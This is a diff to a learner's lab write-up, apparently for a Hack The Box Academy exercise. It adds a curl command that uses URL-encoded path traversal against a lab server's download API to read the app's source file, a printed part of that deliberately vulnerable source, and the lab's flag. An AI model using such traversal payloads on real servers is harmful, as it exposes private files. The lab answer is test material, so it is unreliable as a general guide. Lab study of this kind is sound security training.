@@ -206,7 +206,48 @@ Takes a long time to execute, the page is vulnerable to ReDoS.
 ### Question:
 ![](./attachments/Pasted%20image%2020220727112840.png)
 
-**Answer:** ``
+Gain root with `automate.py`, then `cat /app/soap-wsdl/app.js`.
+
+Alternate:
+
+```
+┌──(kali㉿kali)-[~]
+└─$ curl "http://10.129.9.66:3000/api/download/..%2f..%2f..%2f..%2fapp%2fsoap-wsdl%2fapp.js"
+/*jslint node: true */
+"use strict";
+
+var soap = require('soap');
+var express = require('express');
+var fs = require('fs');
+const { exec } = require("child_process");
+const e = require('express');
+
+// SQL Injection Part
+// Preparing the SQL Server in the memory (SQLI)
+const sqlite = require('better-sqlite3');
+const { stderr } = require('process');
+const db = new sqlite(':memory:', {fileMustExist: true})
+
+(...)
+
+// Preparing the Database
+db.exec("CREATE TABLE users (id INTEGER, name TEXT, email TEXT, username TEXT, password TEXT)");
+
+var stmt = db.prepare("INSERT INTO users VALUES (?, ?, ?, ?, ?)");
+users.forEach(user => {
+  stmt.run([ user.id.toString(), user.first_name + user.last_name, user.email, user.username, user.password])
+});
+stmt.run([
+  "0",
+  "Administrator",
+  "admin@htb.net",
+  "admin",
+  'FLAG{1337_SQL_INJECTION_IS_FUN_:)}'
+])
+
+```
+
+**Answer:** `FLAG{1337_SQL_INJECTION_IS_FUN_:)}`
 
 ---
 **Tags:** [[Hack The Box Academy]]
